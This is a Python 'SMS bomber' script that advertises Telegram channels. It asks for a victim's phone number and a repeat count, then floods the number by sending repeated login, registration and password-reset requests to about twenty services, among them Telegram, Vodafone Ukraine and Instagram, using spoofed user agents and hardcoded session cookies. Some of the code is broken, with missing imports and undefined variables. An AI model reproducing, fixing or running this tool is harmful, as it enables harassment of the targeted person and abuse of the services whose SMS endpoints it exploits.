#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#---------------------------------------------------------------->
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
    phone_plus = "+" + number
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[blue]
 Telegram Channel - @Bomberukr
 Telegram - @Hironotori
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
os.system('termux-open-url https://t.me/Bomberukr')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('[red]Введите номер телефонa (без + ')

number = console.input('[blue]Spavveri>>> ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[red]Введите количество повторов (1-10):\n[blue]Spavveri>>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
         headers = {"User-Agent": fake_useragent.UserAgent().random}
         try:#ok
                 requests.post("https://friends.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
                 print('multiplex.ua')
         except:
                 print('Не отправлено (multiplex.ua)')
         try:#ok
                 requests.post('https://epicentrk.ua/ua/personal/restore/', data={'LANG_ID': 'ua','USER_LOGIN': '+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'p3p': 'policyref="/bitrix/p3p.xml", CP="NON DSP COR CUR ADM DEV PSA PSD OUR UNR BUS UNI COM NAV INT DEM STA"', 'strict-transport-security': 'max-age=15552000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'x-frame-options': 'SAMEORIGIN', 'x-powered-by': 'PHP/7.4.25', 'x-powered-cms': 'Bitrix Site Manager (4bc356218be26e889085d220a9e786a6)', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; LANG=ua; LANG_SUBDOMAIN=ua; store-id=2; BITRIX_SM_LOCATION=def50200d1678734f41f460bcd67c0e7f652714c1d25112350930f045277c17c3fb7e18849564c70e87aff0cb6bdb7fb67ecb0f52d6c1f94ba2cd85eb71a663570f93e7c082af1b70d2dc0699c0fb92fbc1e91bb41207d55050bb0224e2049f81fb29a2b4d5d6a7539faad7f65c9ae4ecd446f2896174b6748a8b10ede7882533e4999299a0f81d0b443d6373f63abf0d4d77a0386c8a62ae62d4c5757efee8f1b9509531f037e80f3f36d177b52881abc9f9015eecb07a4cb6e96dc6dd1982b36c818a2c2204b33c9569da3b7dbc5cad5f5f533e9675802fe8eed5281c1395a5119240aa78011dbe5fb77c1d90995b614055cfeb2c5c0bd353151860c9c80f69d92e4459d62564c278acd490258744932689aaba880b2342988af8fce68527affbded359f5b8708c302a333dde73759c0fdf40a5ccc91180d1f372489007258c4daa195f06c65dcdde2dc4a2bfd9b840e1e70a8618cffeaff22df24bf4ddb740a4f1c303fa7c2c763c939fee7348d03aacd73f7fcfe6078a8497a90d143aa1d3fff2eb11a3e1e9e6fe984b7ae7737130645e4e8b9a37a482b36756a8c8f9210007219ddae33a4fe03dfc228771214786ad545a8f9609e470997effe16605c67292944fce82b5ead32856b755e854f0b23175b6e6a07f0a6a4909de9a0c9a27c4f622ebabeee2fbfc79e6767b8cfa5454ee04288b428606b2b7f8f06488379e59b7b82c84cc7637b8dee7dc4bdc66953e5c17943b028a0309ac2b808c27af7f7e48829e001815b729e95cc5e2e679e6b0597f506b32299651230a809f9831c19d0f8f60bf591323b85f09252505f23ded9779ec7a79b03835ae8cf22ce74933b69310979b3c2b51c630b9c2947e8b3bb6e37e8e86a7f11c97246a0e69f98d9f2b4119fd4f414817d14e88becaf74dec96c8fd19793f148465e34d5686192f8bec785f9769c68257a7d66e53c57959e910b52c72d62175c4ae80bb9807b88402ec75baea52fcb6798aaf0207652aefd32f398b61fe122141945a6728ad39266236784689291f53321c340e49cbfbbc848102bcd88adc3a1d6ccb5cf7e194077788dd8e29df092422a975a811e342476ef5ac9a6c666300f522bcf6efab10665930ca8cabcae0bf36bd79180f88e1faad119b77424df67ef529e4ff99c7d0f; BITRIX_SM_SALE_UID=923039850; __cf_bm=m.Ou9mYjkunw4v3prk5KThV3IsEiJ8jVbYutsIO8HQc-1635883869-0-AZdGHS57eMlrlhw5HODImuySQ6oD7owXlUEaV/ADBv28dDvqGGuJxLP5qXXIcIRcJqINHsgInJbBO9hIeRsCTUk=; _gcl_au=1.1.329786748.1635883887; epic_digital_sid=7889b9f5142983dee7f317fd460b3dc3; sc=8DC29604-D83A-CA43-1D7A-AEA55625A39A; BX_USER_ID=e9be5297d091d2b0a0648651770a6910; _gid=GA1.2.1712308472.1635883935; _hjid=367b87a5-a8e4-49df-9b28-e8bba9438837; _hjFirstSeen=1; _gaexp=GAX1.2.WlLos1ScS0WHGIPl3C-mtA.19018.x578; _dc_gtm_UA-69938460-2=1; _dc_gtm_UA-56814631-1=1; _dc_gtm_UA-69938460-1=1; _gat_UA-69938460-2=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_VC9M164SVX=GS1.1.1635883886.1.1.1635883963.43; _ga=GA1.2.437891472.1635883935', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('epicentrk.ua')
         except:
                 print('Не доставлена (epicentrk.ua)')       
         try:#ok
                 requests.post("https://bi.ua/ukr/login/", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
                 print('bi.ua')
         except:
                 print('Не отправлено (bi.ua)')
         try:#ok
                 requests.post("https://my.ctrs.com.ua/uk/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
                 print('ctrs')
         except:
                 print('Не отправлено (ctrs)')
         try:#ok
                 requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                 print('telegram')
         except:
                 print('Не отправлено (telegram)')
         try:#ok
                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
                 print('vodafone')
         except:
                 print('Не отправлено (vodafone)')
         try:#ok
                 requests.post("https://megasport.ua/ua/authorization/", json={"phone": "+" + number}, headers=headers)
                 print('megasport')
         except:
                 print('Не отправлено (megasport)')
         try:#ok
                 requests.post("https://money4you.ua/login/", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
                 print('money4you.ua')
         except:
                 print('Не отправлено (money4you.ua)')
         try:
                 requests.post('https://www.instagram.com/accounts/password/reset/', data={'email_or_username': number}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
                 print('instagram.com')
         except:
                 print('Не отправлено (instagram.com)')
         try:
                 requests.post('https://client.taximaxim.com/uk-UA/login/', json={'locale': 'uk','phone': number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
                 print('cabinet.taximaxim.ru')
         except:
                 print('Не отправлено (cabinet.taximaxim.ru)')
         try:
                 requests.post('https://md-fashion.ua/ru/signup', data={'phone': '+' + number}, headers=headers)
                 print('md-fashion.com.ua')
         except:
                 print('Не отправлено (md-fashion.com.ua)')
         try:#numberis
                 requests.post('https://be.budusushi.ua/login', data={'LoginForm[username]': phone[2:]}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; _gcl_au=1.1.1732122179.1637071555; _ga=GA1.2.781960988.1637071555; _gid=GA1.2.978787047.1637071555; _gat_UA-106901939-3=1', 'referer': 'https://budusushi.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'DNT':'1'})
                 print('be.budusushi.ua')
         except:
                 print('Не отправлено (be.budusushi.ua)')
         try:
                 requests.post('https://dnipro-m.ua/auth/auth/redirect/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('dnipro-m.ua')
         except:
                 print('Не отправлено (dnipro-m.ua)')
         try:#numberis
                 requests.post('https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', json={'params':{'version':'2.1.2','language':'ua','source':'WebApp','token':'null','manufacture':'','childNumber':'','accessType':'','spinner':'1'},'requests':{'loginV2':{'id':phone[3:]}}}, headers={'X-Requested-With':'XMLHttpRequest', 'SWEExtSource': 'JSONConverter', 'SWEExtCmd': 'Execute', 'vary': 'Accept-Encoding', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('cscapp.vodafone.ua')
         except:
                 print('Не отправлено (cscapp.vodafone.ua)')
         try:
                 requests.post('https://cabinet.skarb.com.ua/user/passwordrecovery', data={'_csrf': 'mG9Ke7hr_W-jNPBrIONmoYcy4_yhohb65oCkznNj2RruKnw13wWJG-htyAdkmwH3wEW2xcfjTMit5pGlKRXgLA==','login': '+' + number,'password': 'as23Afs312','subscribe': '0','subscribe': '1'}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=300;', 'cookie': 'PHPSESSID=9caf7faf4ea190ac1af68c81cf564e12; _csrf=bdcd3f1b1d4fcd9630fbccd675c6c621e778b9dc164ae0b824a47490bc77b251a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22vE6NgnttKY8lDxgVGwU9fAZ2Kf5kZv96%22%3B%7D; _hjid=ac40cfb3-3566-4f11-80e6-03fa308b762c; _hjFirstSeen=1; _ga=GA1.3.1320069702.1635787230; _gid=GA1.3.666518449.1635787230; _gat_UA-168694557-1=1; label_entry=ascbiiu; _hjAbsoluteSessionInProgress=0; carrotquest_device_guid=46f523f6-661a-40db-a58f-1f08a03ba975; carrotquest_uid=1037496607563582470; carrotquest_auth_token=user.1037496607563582470.20750-1fe4d375c930f1f6c1c80e0db5.5cd10bb1f419ffc0f8a08c1b206fffc14213b56ba506f318; carrotquest_realtime_services_transport=wss; carrotquest_session=iu41d6pco8da14aputbtp7l5snvrtc9l; carrotquest_session_started=1', 'referer': 'https://cabinet.skarb.com.ua/user/register', 'upgrade-insecure-requests': '1', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'max-age=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('cabinet.skarb.com.ua')
         except:
                 print('Не отправлено (cabinet.skarb.com.ua)')
         try:
                 requests.post('https://www.nl.ua/ua/personal/', data={'component': 'bxmaker.authuserphone.login','method': 'sendCode','phone': '+' + number,'registration': 'N'}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf; cookiesession1=678A3E0DPQRSTUV0123456789834B123; _gid=GA1.2.633615997.1636801270; _gac_UA-12429852-1=1.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gat_gtag_UA_12429852_1=1; _gcl_aw=GCL.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gcl_au=1.1.915257014.1636801270; _ga_8ZPHLHGVS0=GS1.1.1636801269.1.1.1636801272.0; _ga=GA1.2.122356831.1636801270', 'referer': 'https://www.nl.ua/ua/personal/', 'referrer-policy': 'no-referrer-when-downgrade', 'server': 'nginx/1.20.1', 'strict-transport-security': 'max-age=31536000;', 'vary': 'Accept-Encoding,User-Agent', 'x-powered-by': 'PHP/5.6.40', 'x-powered-cms': 'Bitrix Site Manager (23046a56eefe26b07f835119ad2f8f24)', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36', 'DNT':'1'})
                 print('nl.ua')
         except:
                 print('Не отправлено (nl.ua)')
         try:
                 requests.post('https://doc.telemed.care/auth/login', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
                 print('telemed.care')
         except:
                 print('Не доставлено (telemed.care)')
